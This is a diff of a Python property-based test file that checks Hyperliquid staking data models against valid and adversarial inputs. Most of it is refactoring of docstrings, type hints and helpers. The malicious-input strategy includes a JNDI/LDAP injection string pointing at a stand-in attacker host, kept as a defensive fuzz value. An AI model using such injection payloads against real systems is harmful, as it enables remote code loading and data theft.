@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw staking models.
 
 These tests validate critical security boundary models that process external staking data.
-The models tested here are essential for staking delegation tracking, validator management, and reward calculations.
+The models tested here are essential for staking delegation, validators, and reward calculations.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious staking data that could manipulate delegation amounts and validator addresses
@@ -37,13 +37,31 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
+# =============================================================================
+# HELPER FUNCTIONS FOR STRATEGY BUILDERS
+# =============================================================================
+
+
+def _build_hex_address(hex_part: str) -> str:
+    """Build hex address with 0x prefix."""
+    return f"0x{hex_part}"
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR STAKING MODEL TESTING
 # =============================================================================
 
 
 def ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses for validators."""
+    """Generate valid Ethereum addresses for validators.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid validator addresses
         st.sampled_from([
@@ -54,14 +72,18 @@ def ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def transaction_hash_strategy() -> SearchStrategy[str]:
-    """Generate valid transaction hashes."""
+    """Generate valid transaction hashes.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid transaction hashes
         st.sampled_from([
@@ -71,14 +93,18 @@ def transaction_hash_strategy() -> SearchStrategy[str]:
         ]),
         # Generated hashes
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _build_hex_address,
             st.text(min_size=64, max_size=64, alphabet=string.hexdigits),
         ),
     ])
 
 
 def financial_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial amounts."""
+    """Generate valid decimal strings for financial amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Normal decimal values
         st.decimals(
@@ -103,18 +129,30 @@ def financial_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def staking_source_strategy() -> SearchStrategy[str]:
-    """Generate valid staking reward sources."""
+    """Generate valid staking reward sources.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["delegation", "validation", "commission", "bonus", "penalty"])
 
 
 @st.composite
 def valid_delegation_item_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid delegation item data."""
+    """Generate valid delegation item data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "validator": draw(ethereum_address_strategy()),
         "amount": draw(financial_decimal_string_strategy()),
@@ -124,7 +162,11 @@ def valid_delegation_item_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_delegator_summary_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid delegator summary data."""
+    """Generate valid delegator summary data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "delegated": draw(financial_decimal_string_strategy()),
         "undelegated": draw(financial_decimal_string_strategy()),
@@ -135,7 +177,11 @@ def valid_delegator_summary_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_history_delegate_delta_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid history delegate delta data."""
+    """Generate valid history delegate delta data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "validator": draw(ethereum_address_strategy()),
         "amount": draw(financial_decimal_string_strategy()),
@@ -145,7 +191,11 @@ def valid_history_delegate_delta_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_history_delta_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid history delta data."""
+    """Generate valid history delta data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "delegate": draw(valid_history_delegate_delta_data()),
     }
@@ -153,7 +203,11 @@ def valid_history_delta_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_history_item_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid history item data."""
+    """Generate valid history item data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "time": draw(timestamp_strategy()),
         "hash": draw(transaction_hash_strategy()),
@@ -163,7 +217,11 @@ def valid_history_item_data(draw: DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_reward_item_data(draw: DrawFn) -> dict[str, Any]:
-    """Generate valid reward item data."""
+    """Generate valid reward item data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "time": draw(timestamp_strategy()),
         "source": draw(staking_source_strategy()),
@@ -171,8 +229,12 @@ def valid_reward_item_data(draw: DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_staking_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for staking security testing."""
+def malicious_staking_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for staking security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Staking manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-stake}"),
@@ -231,7 +293,7 @@ class TestHyperliquidRawDelegationItemProperties:
     def test_delegation_item_validation_success_properties(
         self, delegation_data: dict[str, Any]
     ) -> None:
-        """Property: Valid delegation item data should always create valid HyperliquidRawDelegationItem objects."""
+        """Property: Valid delegation item data should create valid HyperliquidRawDelegationItem."""
         # Skip invalid data
         try:
             # Validate validator address
@@ -273,10 +335,10 @@ class TestHyperliquidRawDelegationItemProperties:
         malicious_value=malicious_staking_strategy(),
     )
     def test_delegation_item_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Delegation item model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Delegation item model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "validator": "0x5ac99df645f3414876c816caa18b2d234024b487",
             "amount": "12060.16529862",
             "lockedUntilTimestamp": 1735466781353,
@@ -315,8 +377,7 @@ class TestHyperliquidRawDelegationItemProperties:
 
         # Check if address is valid Ethereum format
         is_valid = (
-            isinstance(validator_address, str)
-            and validator_address.strip()
+            validator_address.strip()
             and validator_address.startswith("0x")
             and len(validator_address) == 42
             and all(c in string.hexdigits for c in validator_address[2:])
@@ -369,7 +430,7 @@ class TestHyperliquidRawDelegatorSummaryResponseProperties:
     def test_delegator_summary_validation_success_properties(
         self, summary_data: dict[str, Any]
     ) -> None:
-        """Property: Valid delegator summary data should always create valid HyperliquidRawDelegatorSummaryResponse objects."""
+        """Property: Valid delegator summary data should create valid objects."""
         # Skip invalid data
         try:
             # Validate decimal fields
@@ -407,10 +468,10 @@ class TestHyperliquidRawDelegatorSummaryResponseProperties:
         malicious_value=malicious_staking_strategy(),
     )
     def test_delegator_summary_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Delegator summary model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Delegator summary model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "delegated": "12060.16529862",
             "undelegated": "0.0",
             "totalPendingWithdrawal": "0.0",
@@ -440,7 +501,7 @@ class TestHyperliquidRawDelegatorHistoryProperties:
     def test_history_delegate_delta_validation_success_properties(
         self, delegate_delta_data: dict[str, Any]
     ) -> None:
-        """Property: Valid history delegate delta data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate validator address
@@ -475,7 +536,7 @@ class TestHyperliquidRawDelegatorHistoryProperties:
     def test_history_item_validation_success_properties(
         self, history_item_data: dict[str, Any]
     ) -> None:
-        """Property: Valid history item data should always create valid objects."""
+        """Property: Valid data should create valid objects."""
         # Skip invalid data
         try:
             # Validate timestamp
@@ -536,8 +597,7 @@ class TestHyperliquidRawDelegatorHistoryProperties:
 
         # Check if hash is valid format
         is_valid = (
-            isinstance(transaction_hash, str)
-            and transaction_hash.strip()
+            transaction_hash.strip()
             and transaction_hash.startswith("0x")
             and len(transaction_hash) == 66
             and all(c in string.hexdigits for c in transaction_hash[2:])
@@ -563,7 +623,7 @@ class TestHyperliquidRawDelegatorRewardItemProperties:
 
     @given(reward_data=valid_reward_item_data())
     def test_reward_item_validation_success_properties(self, reward_data: dict[str, Any]) -> None:
-        """Property: Valid reward item data should always create valid HyperliquidRawDelegatorRewardItem objects."""
+        """Property: Valid reward item data should create valid objects."""
         # Skip invalid data
         try:
             # Validate timestamp
@@ -596,10 +656,10 @@ class TestHyperliquidRawDelegatorRewardItemProperties:
         malicious_value=malicious_staking_strategy(),
     )
     def test_reward_item_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Reward item model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Reward item model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "time": 1736726400073,
             "source": "delegation",
             "totalAmount": "0.73117184",
@@ -634,9 +694,9 @@ class TestHyperliquidRawStakingResponseProperties:
     def test_delegations_response_validation_success_properties(
         self, delegations: list[dict[str, Any]]
     ) -> None:
-        """Property: Valid delegations list should always create valid HyperliquidRawDelegationsResponse objects."""
+        """Property: Valid delegations list should create valid objects."""
         # Skip invalid delegations
-        valid_delegations = []
+        valid_delegations: list[dict[str, Any]] = []
         for delegation in delegations:
             try:
                 # Validate each delegation
@@ -686,9 +746,9 @@ class TestHyperliquidRawStakingResponseProperties:
     def test_rewards_response_validation_success_properties(
         self, rewards: list[dict[str, Any]]
     ) -> None:
-        """Property: Valid rewards list should always create valid HyperliquidRawDelegatorRewardsResponse objects."""
+        """Property: Valid rewards list should create valid objects."""
         # Skip invalid rewards
-        valid_rewards = []
+        valid_rewards: list[dict[str, Any]] = []
         for reward in rewards:
             try:
                 # Validate each reward
@@ -734,11 +794,11 @@ class TestHyperliquidRawStakingIntegrationProperties:
         malicious_value=malicious_staking_strategy(),
     )
     def test_staking_models_integration_properties(
-        self, delegations: list[dict[str, Any]], malicious_value: Any
+        self, delegations: list[dict[str, Any]], malicious_value: MaliciousInput
     ) -> None:
         """Property: Staking models should work consistently together."""
         # Skip invalid delegations and create valid list
-        valid_delegations = []
+        valid_delegations: list[dict[str, Any]] = []
         for delegation in delegations:
             try:
                 validator = delegation["validator"]
@@ -797,16 +857,13 @@ class TestHyperliquidRawStakingIntegrationProperties:
         ])
     )
     def test_staking_models_adversarial_input_properties(
-        self, complete_malicious_data: Any
+        self, complete_malicious_data: dict[str, MaliciousInput]
     ) -> None:
-        """Property: All staking models should safely handle complete adversarial input."""
+        """Property: All staking models should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
-            # Try different response types with malicious data
-            if isinstance(complete_malicious_data, dict):
-                HyperliquidRawDelegationItem.model_validate(complete_malicious_data)
-            else:
-                HyperliquidRawDelegationsResponse.model_validate(complete_malicious_data)
+            # Try delegation item validation with malicious data
+            HyperliquidRawDelegationItem.model_validate(complete_malicious_data)
 
 
 # =============================================================================
